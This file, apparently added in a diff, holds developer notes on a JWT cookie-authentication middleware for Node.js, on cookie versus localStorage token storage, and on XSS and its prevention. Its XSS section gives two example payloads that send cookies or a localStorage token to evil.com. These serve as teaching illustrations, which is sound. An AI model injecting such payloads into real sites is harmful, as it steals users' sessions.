@@ -1,0 +1,106 @@
+
+===============================
+🔐 JWT Authentication Middleware
+===============================
+
+Purpose:
+--------
+To protect routes by verifying if the incoming request has a valid JWT token in cookies.
+
+Code:
+-----
+const jwt = require('jsonwebtoken');
+const User = require('../models/User');
+
+const protect = async (req, res, next) => {
+  const token = req.cookies.token;
+  if (!token) return res.status(401).json({ message: 'Not authorized, no token' });
+
+  try {
+    const decoded = jwt.verify(token, process.env.JWT_SECRET);
+    req.user = await User.findById(decoded.id).select('-password');
+    next();
+  } catch (err) {
+    res.status(401).json({ message: 'Token invalid or expired' });
+  }
+};
+
+module.exports = protect;
+
+Concepts:
+---------
+1. jwt.verify(): Validates and decodes JWT token.
+2. req.cookies.token: Extracts the token from cookies.
+3. req.user = ...: Attaches the authenticated user's data to the request object.
+
+==================================
+🧁 Why Use Cookies over LocalStorage
+==================================
+
+Cookies:
+--------
+- Automatically sent with every HTTP request.
+- Can be marked httpOnly → not accessible by JavaScript.
+- Can be made secure (only sent over HTTPS).
+- Can be protected with sameSite to avoid CSRF.
+
+localStorage:
+-------------
+- Accessible via JavaScript (vulnerable to XSS).
+- Not sent with requests automatically.
+- Easy to misuse for storing sensitive tokens.
+
+Recommendation:
+---------------
+Use cookies with these options:
+res.cookie('token', token, {
+  httpOnly: true,
+  secure: process.env.NODE_ENV === 'production',
+  sameSite: 'strict',
+  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
+});
+
+========================
+🧨 What is XSS (Cross-Site Scripting)?
+========================
+
+Definition:
+-----------
+XSS is a vulnerability where attackers inject malicious JavaScript into your site, which runs in the browser of other users.
+
+Example:
+--------
+<script>
+  fetch("https://evil.com/steal?cookie=" + document.cookie)
+</script>
+
+What Attackers Can Do:
+----------------------
+- Steal cookies or tokens.
+- Redirect users to malicious sites.
+- Fake login forms (phishing).
+- Install keyloggers.
+
+Why localStorage is Dangerous:
+------------------------------
+localStorage is readable by JavaScript. So if an attacker injects a script:
+const token = localStorage.getItem('token');
+fetch("https://evil.com?token=" + token);
+
+they can steal the token.
+
+Prevention:
+-----------
+1. Sanitize user input.
+2. Use httpOnly cookies to prevent JS access to tokens.
+3. Apply a Content Security Policy (CSP).
+
+CSP Example:
+------------
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
+
+Summary:
+--------
+- Use cookies with httpOnly for sensitive tokens.
+- Sanitize user input to avoid executing scripts.
+- XSS allows malicious JS to run — protect your app with security best practices.
